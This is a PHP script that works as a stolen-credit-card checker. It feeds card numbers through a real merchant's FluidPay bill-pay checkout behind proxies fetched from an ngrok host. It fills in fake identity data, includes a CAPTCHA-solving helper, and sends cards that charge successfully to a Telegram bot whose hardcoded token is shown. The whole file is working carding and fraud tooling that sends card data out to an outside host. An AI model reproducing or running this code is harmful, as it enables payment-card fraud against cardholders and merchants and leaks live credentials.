<?php
error_reporting(0);
$time_start = microtime(true);
set_time_limit(200);
//include("firstDataMessage.php");
function GetStr($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}


function RandomString($length = 16)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

function cURLc($url, $headers, $postfields, $customrequest) {

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        // CURLOPT_SSL_VERIFYPEER => 1,
        // CURLOPT_SSL_VERIFYHOST => 1,
        // CURLOPT_COOKIE => "itrack=$cookie",
        CURLOPT_HEADER => 1,
        CURLOPT_CUSTOMREQUEST => $customrequest,
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_POSTFIELDS => $postfields
    ));
    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}
function cURL($url, $headers, $postfields, $customrequest, $_fls, $cookie) {

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => $_fls,
        CURLOPT_COOKIE => "itrack=$cookie",
        CURLOPT_HEADER => 1,
        CURLOPT_CUSTOMREQUEST => $customrequest,
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_POSTFIELDS => $postfields
    ));
    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}
$ips = file_get_contents("https://magic.bins.ngrok.io/io.php/");
function cURL_ProxyOn($url, $headers, $postfields, $customrequest, $_fls, $cookie) {

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => $_fls,
        // CURLOPT_PROXY => "http://scraperapi.session_number=$port.ultra_premium=true.country_code=uk:f73965b26e9d8457634c8b1597c0e6da@proxy-server.scraperapi.com:8001/",
        CURLOPT_PROXY => "$ips",
        CURLOPT_HEADER => 1,
        CURLOPT_COOKIE => "itrack=$cookie",
        CURLOPT_CUSTOMREQUEST => $customrequest,
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_POSTFIELDS => $postfields
    ));
    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}
function randomInfo(){

    $curl = curl_init();

    curl_setopt_array($curl, array(
        CURLOPT_URL => 'https://namegenerator.in/assets/refresh.php?location=united-states',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => '',
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 0,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_PROXY => "$ips",
        CURLOPT_CUSTOMREQUEST => 'GET',
    ));

    $response = curl_exec($curl);

    curl_close($curl);
    return $response;
}
extract($_GET);
$separator = explode("|", $lista);
$cc = $separator[0];
$ccbin = substr($cc, 0,6);
$mm = $separator[1];
$yy = $separator[2];
$yy1 = substr($yy, 2,2);
$cvv = $separator[3];

$cbin = substr($cc, 0,1);
$rnum = rand(1111,9999);


if($cbin == 5){
    $cbin = 'masterCard';
}
else if($cbin == 4){
    $cbin = 'visa';
}

function solveCaptcha($site,$siteKey,$clientKey){
    $createTask =  cURLc(
        "https://api.capmonster.cloud/createTask",
        $headers = [
            "Content-Type: application/json",
            "accept: application/json"
        ],
        '{"clientKey":"'.$clientKey.'","task":{"type":"NoCaptchaTaskProxyless","websiteURL":"'.$site.'","websiteKey":"'.$siteKey.'"}}',
        "POST"
    );
    $taskId = getstr(json_encode($createTask,true),'"taskId\":','}');
    $status = "processing";
    $gResponse = "";
    while ($status == "processing") {
        sleep(3);
        $getTaskResult =  cURLc(
            "https://api.capmonster.cloud/getTaskResult ",
            $headers = [
                "Content-Type: application/json",
                "accept: application/json"
            ],
            '{"clientKey":"'.$clientKey.'","taskId": '.$taskId.'}',
            "POST"
        );
        $status = getstr($getTaskResult,'"status":"','"');
        $gResponse = getstr($getTaskResult,'"gRecaptchaResponse":"','"');}
    return $getTaskResult ;
}
$port = rand(10000, 11000);
$ch = curl_init();
curl_setopt_array($ch, array(
    CURLOPT_URL => "https://binov.net/",
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_HEADER => 1,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/x-www-form-urlencoded",
        "Referer: https://binov.net/",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36 Edg/101.0.1210.32"
    ],
    CURLOPT_POSTFIELDS => "BIN=$ccbin"
));
$g_ccdets = curl_exec($ch);
//$cc_bin = GetStr($g_ccdets, '</tr><tr><td>' , '</td>');
$cc_type0 = GetStr($g_ccdets, "$cc_bin</td><td>" , '</td>');
$cc_bname = GetStr($g_ccdets, "$cc_type0</td><td>" , '</td>');
$cc_type1 = GetStr($g_ccdets, "$cc_bname</td><td>" , '</td>');
$cc_type2 = GetStr($g_ccdets, "$cc_type1</td><td>" , '</td>');
$cc_country = GetStr($g_ccdets, "$cc_type2</td><td>" , '</td>');
// $CC_fDets = "BIN: $ccbin BIN Info: $type0-$type1-$type2 Bank: $cc_bname Country: $cc_country";
$CC_fDets = "Bank: $cc_bname Country: $cc_country";
$randomShits = randomInfo();
$data = json_decode($randomShits, true);
$fname = explode(" ", $data['name'])[0];
$lname = explode(" ", $data['name'])[1];
$email = $data['email']['address'];
$street = $data['street1'];
$local = GetStr($randomShits, '"street2":', ',"phone"');
$city = GetStr($local, '"', ',');
$state = GetStr($local, ', ', ' ');
$phone = str_replace("-", "", $data['phone']);
$postcode = GetStr($local, "$state" , '"');

$cookie = RandomString();
$str = substr(randomString(), 0, 7);


$step1 = cURL_ProxyOn(
    "https://www.arborcompany.com/locations/virginia/herndon/pay-my-bill",
    $headers = [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
    ],
    "",
    "GET",
    1,
    $cookie

);
$cartID = GetStr($step1, "cartID: '", "'");
$checkoutID = GetStr($step1, "cart.addProductCheckout('", "'");


 $opt = cURL_ProxyOn(
    "https://app.fluidpay.com/api/cart/$cartID/session",
    $headers = [
        'content-type: application/json',
        'accept: */*',
        'origin: https://www.arborcompany.com',
        'referer: https://www.arborcompany.com/locations/virginia/herndon/pay-my-bill',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
    ],
    '{"checkout_url":"https://app.fluidpay.com","cancel_url":"https://www.arborcompany.com/locations/virginia/herndon","success_url":"https://www.arborcompany.com/locations/virginia/herndon"}',
    "POST",
    1,
    $cookie
);
$sessn = GetStr($opt, '"data":{"id":"', '"');


$step3 = cURL_ProxyOn(
    "https://app.fluidpay.com/api/cart/$cartID/session/$sessn",
    $headers = [
        'accept: */*',
        'content-type: application/json',
        "https://app.fluidpay.com/api/cart/session/$sessn",
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
    ],
    '{"public_hash":"' . $checkoutID . '","qty":1,"price":100}',
    "POST",
    1,
    $cookie
);

//
$step2 = cURL_ProxyOn(
    "https://app.fluidpay.com/api/cart/$cartID",
    $headers = [
        'accept: */*',
        'origin: https://www.arborcompany.com',
        "https://app.fluidpay.com/api/cart/$cartID/session/$sessn",
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
    ],
    "",
    "GET",
    1,
    $cookie
);
$cusData = GetStr($step2, '"custom_fields":', ']');
$processorsData = GetStr($step2, '"processors":', ']');
$custom_fields = GetStr($cusData, '[{"id":"', '"');
$billinfo = GetStr($cusData, '},{"id":"', '"');
$cardproc = GetStr($processorsData, '[{"id":"', '"');
$achproc = GetStr($processorsData, '},{"id":"', '"');


//
  $execute = cURL_ProxyOn(
    "https://app.fluidpay.com/api/cart/checkout",
    $headers = [
        'accept: */*',
        'content-type: application/json',
        "referer: https://app.fluidpay.com/api/cart/$cartID",
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
    ],
    '{"cart_session_id":"' . $sessn . '","card_processor_id":"' . $cardproc . '","ach_processor_id":"' . $achproc . '","payment_method":{"card":{"number":"' . $cc . '","expiration_date":"' . $mm . '/' . $yy1 . '","cvc":"' . $cvv . '"}},"custom_fields":{},"billing_address":{"first_name":"dsaas","last_name":"asdsad","company":"","address_line_1":"asdasd","address_line_2":"","city":"sadsad","state":"CA","postal_code":"90001","country":"US","email":"' . $email . '","phone":"2165123124","fax":""},"shipping_address":{"first_name":"","last_name":"","company":"","address_line_1":"","address_line_2":"","city":"","state":"","postal_code":"","country":"","email":"","phone":"","fax":""}}',
    "POST",
    1,
    $cookie
);

if (strpos($execute, '"pi_id":"pi_')){
    echo '<tr><td><span class="badge bg-success">LIVE</span></td><td><span> => </span></td><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td> <td><span class="badge badge-success badge-pill">Charged['.$amnt.'.00]$</span> <span class="badge bg-light text-dark">'.$CC_fDets.'</span></td></tr><br>';
    file_get_contents('https://api.telegram.org/bot1405110178:AAFo20MsFbsCxH5tjWoPFKHsOVRgbdUwJWU/sendMessage?chat_id=1087333523&text='.$lista.' CHARGED CCN - STRPE GATE');
}elseif(strpos($execute, '"err":"Stripe API error occurred: ') || $response == 'Your card was declined.') {
    echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill"> "MESSAGE": "'.urldecode($response).'" - Retries: '.$retries.'</span></td><td><span class="badge badge-info badge-pill"> INFO: '.$ips.' Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';
}else {
    echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">Processing unsuccessful(May be Merchant is dead or network is blocked) - Retries: '.$retries.'</span></td><td><span class="badge badge-info badge-pill"> INFO: '.$ips.' Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';
}


unlink("cookies/$cookie.txt");

?>